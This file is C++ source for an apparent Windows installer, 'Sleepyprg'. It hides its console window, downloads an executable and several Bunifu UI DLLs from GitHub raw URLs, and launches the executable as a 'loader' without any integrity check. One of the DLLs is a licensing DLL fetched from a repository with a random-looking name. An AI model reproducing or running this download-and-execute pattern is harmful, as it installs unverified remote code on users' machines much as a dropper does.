#include <iostream>
#include <string>
#include <windows.h>
#include <cstdio>
#include <random>
#pragma comment(lib, "Urlmon.lib")
using namespace std;
#pragma warning(disable : 4996) //_CRT_SECURE_NO_WARNINGS

int main()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    cout << "Installing...\n";

    system("mkdir \"C:\\Program Files (x86)\\MkPrograms""");
    system("mkdir \"C:\\Program Files (x86)\\MkPrograms\\Sleepyprg""");

    const wchar_t* srcURL = L"https://github.com/Masterking2019/mkprograms/raw/main/CustomProgram.exe";
    const wchar_t* destFile = L"C:\\Program Files (x86)\\MkPrograms\\Sleepyprg\\f.exe"; // dowload the program itself

    const wchar_t* srcURL1 = L"https://github.com/Ch1nChun/5qJw1bZLmuJeUuoTwUGt/raw/main/Bunifu.Licensing.dll";
    const wchar_t* destFile1 = L"C:\\Program Files (x86)\\MkPrograms\\Sleepyprg\\Bunifu.Licensing.dll"; // dowload the program itself
    const wchar_t* srcURL2 = L"https://github.com/Ch1nChun/5qJw1bZLmuJeUuoTwUGt/raw/main/Bunifu.UI.WinForms.1.5.3.dll";
    const wchar_t* destFile2 = L"C:\\Program Files (x86)\\MkPrograms\\Sleepyprg\\Bunifu.UI.WinForms.1.5.3.dll"; // dowload the program itself
    const wchar_t* srcURL3 = L"https://github.com/Ch1nChun/5qJw1bZLmuJeUuoTwUGt/raw/main/Bunifu.UI.WinForms.BunifuButton.dll";
    const wchar_t* destFile3 = L"C:\\Program Files (x86)\\MkPrograms\\Sleepyprg\\Bunifu.UI.WinForms.BunifuButton.dll"; // dowload the program itself
    const wchar_t* srcURL4 = L"https://github.com/Ch1nChun/5qJw1bZLmuJeUuoTwUGt/raw/main/Bunifu.UI.WinForms.BunifuCheckBox.dll";
    const wchar_t* destFile4 = L"C:\\Program Files (x86)\\MkPrograms\\Sleepyprg\\Bunifu.UI.WinForms.BunifuCheckBox.dll"; // dowload the program itself
    const wchar_t* srcURL5 = L"https://github.com/Ch1nChun/5qJw1bZLmuJeUuoTwUGt/raw/main/Bunifu.UI.WinForms.BunifuGradientPanel.dll";
    const wchar_t* destFile5 = L"C:\\Program Files (x86)\\MkPrograms\\Sleepyprg\\Bunifu.UI.WinForms.BunifuGradientPanel.dll"; // dowload the program itself
    const wchar_t* srcURL6 = L"https://github.com/Ch1nChun/5qJw1bZLmuJeUuoTwUGt/raw/main/Bunifu.UI.WinForms.BunifuLabel.dll";
    const wchar_t* destFile6 = L"C:\\Program Files (x86)\\MkPrograms\\Sleepyprg\\Bunifu.UI.WinForms.BunifuLabel.dll"; // dowload the program itself
    const wchar_t* srcURL7 = L"https://github.com/Ch1nChun/5qJw1bZLmuJeUuoTwUGt/raw/main/Bunifu.UI.WinForms.BunifuTextbox.dll";
    const wchar_t* destFile7 = L"C:\\Program Files (x86)\\MkPrograms\\Sleepyprg\\Bunifu.UI.WinForms.BunifuTextbox.dll"; // dowload the program itself

    URLDownloadToFile(NULL, srcURL, destFile, 0, NULL);

    if (FILE* file1 = fopen("C:\\Program Files (x86)\\MkPrograms\\Sleepyprg\\Bunifu.Licensing.dll", "r")) {
        fclose(file1);
    }
    else {
        cout << "File 1 not found...\n";
        URLDownloadToFile(NULL, srcURL1, destFile1, 0, NULL);
    }

    if (FILE* file2 = fopen("C:\\Program Files (x86)\\MkPrograms\\Sleepyprg\\Bunifu.UI.WinForms.1.5.3.dll", "r")) {
        fclose(file2);
    }
    else {
        cout << "File 2 not found...\n";
        URLDownloadToFile(NULL, srcURL2, destFile2, 0, NULL);
    }
    
    if (FILE* file3 = fopen("C:\\Program Files (x86)\\MkPrograms\\Sleepyprg\\Bunifu.UI.WinForms.BunifuButton.dll", "r")) {
        fclose(file3);
    }
    else {
        cout << "File 3 not found...\n";
        URLDownloadToFile(NULL, srcURL3, destFile3, 0, NULL);
    }

    if (FILE* file4 = fopen("C:\\Program Files (x86)\\MkPrograms\\Sleepyprg\\Bunifu.UI.WinForms.BunifuCheckBox.dll", "r")) {
        fclose(file4);
    }
    else {
        cout << "File 4 not found...\n";
        URLDownloadToFile(NULL, srcURL4, destFile4, 0, NULL);
    }

    if (FILE* file5 = fopen("C:\\Program Files (x86)\\MkPrograms\\Sleepyprg\\Bunifu.UI.WinForms.BunifuGradientPanel.dll", "r")) {
        fclose(file5);
    }
    else {
        cout << "File 5 not found...\n";
        URLDownloadToFile(NULL, srcURL5, destFile5, 0, NULL);
    }

    if (FILE* file6 = fopen("C:\\Program Files (x86)\\MkPrograms\\Sleepyprg\\Bunifu.UI.WinForms.BunifuLabel.dll", "r")) {
        fclose(file6);
    }
    else {
        cout << "File 6 not found...\n";
        URLDownloadToFile(NULL, srcURL6, destFile6, 0, NULL);
    }

    if (FILE* file7 = fopen("C:\\Program Files (x86)\\MkPrograms\\Sleepyprg\\Bunifu.UI.WinForms.BunifuTextbox.dll", "r")) {
        fclose(file7);
    }
    else {
        cout << "File 7 not found...\n";
        URLDownloadToFile(NULL, srcURL7, destFile7, 0, NULL);
    }

    cout << "Running loader...\n";

    ShellExecute(NULL, NULL, L"C:\\Program Files (x86)\\MkPrograms\\Sleepyprg\\f.exe", NULL, NULL, SW_NORMAL);

    cout << "Installation completed...\n";
}
